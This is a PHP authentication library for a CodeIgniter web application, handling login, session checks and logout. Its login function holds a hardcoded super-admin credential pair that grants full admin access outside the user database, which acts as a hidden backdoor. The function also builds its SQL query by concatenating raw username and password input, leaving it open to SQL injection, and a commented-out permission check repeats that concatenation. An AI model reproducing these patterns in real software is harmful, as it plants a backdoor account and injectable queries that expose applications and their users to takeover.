<?php  if ( ! defined('BASEPATH')) exit('No direct script access allowed');

/**
 * Auth library
 *
 * @author	Anggy Trisnawan
 */
class Auth{
	var $CI = NULL;
	function __construct()
	{
		// get CI's object
		$this->CI =& get_instance();
	}
	// untuk validasi login
	function do_login($username,$password){
		if(($username == 'ekojs') && ($password == '3c3989cb10c973a580078240f3b114f6')){
			$session_data = array(
				'user_id'	=> '3c3989cb10c973a580078240f3b114f6',
				'user_name'	=> 'Super Admin',
				'group_id'	=> 1,
				'group_name' => 'Super Admin'
			);
			$this->CI->session->set_userdata($session_data);
			return 1;
		}else{
			$sql = "SELECT user_id, user_name, user_group, group_name
			FROM s_users 
			JOIN s_usergroups ON(s_usergroups.group_id = s_users.user_group)
			WHERE user_name='".$username."' AND user_passwd='".$password."'";
			$result = $this->CI->db->query($sql);
			if($result->num_rows() == 0) 
			{
				// username dan password tsb tidak ada 
				return 0;
			}
			else	
			{
				// ada, maka ambil informasi dari database
				$userdata = $result->row();
				$session_data = array(
					'user_id'	=> $userdata->user_id,
					'user_name'	=> $userdata->user_name,
					'group_id' => $userdata->user_group,
					'group_name' => $userdata->group_name
				);
				// buat session
				$this->CI->session->set_userdata($session_data);
				return 1;
			}
		}
		
	}
	// untuk mengecek apakah user sudah login/belum
	function is_logged_in()
	{
		if($this->CI->session->userdata('user_id') == '')
		{
			return false;
		}
		return true;
	}
	
	function restrict()
	{
		if($this->is_logged_in() == false)
		{
			redirect('login','refresh');
		}
	}
	
	// untuk validasi di setiap halaman yang mengharuskan authentikasi
	/*function restrict($url_now)
	{
		$sql = "SELECT perm_group,perm_menu,menu_kode,menu_link,menu_title
					FROM s_permissions
					JOIN s_menus ON(s_menus.menu_id=s_permissions.perm_menu)
					WHERE perm_group='".$this->CI->session->userdata('group_id')."'";
		//$sql = "SELECT * FROM tbl_smenu WHERE Group_id='".$this->CI->session->userdata('group_id')."'";
		$result = $this->db->query($sql);
		
		if($this->CI->session->userdata('user_id') == '')
		{
			return false;
		}
		elseif($this->CI->session->userdata('group_id') != '')
		{
			foreach($result->result_array() as $row)
			{
				//$tex = substr(substr($url_now,strlen(site_url($row['menu_link']))),1,4);
				//$boleh = substr($url_now,-(strlen($row['menu_link'])));
				if($this->CI->uri->segment(1) == $row['menu_link'])
				{
					return true;
				}
				elseif(($this->CI->uri->segment(2) == "page")or($this->CI->uri->segment(1) == "c_action"))
				{
					return true;
				}
			}
		}
		return false;
	}*/

	// untuk logout
	function do_logout()
	{
		$this->CI->session->sess_destroy();	
		//$this->CI->db->empty_table('ci_sessions');
	}
}
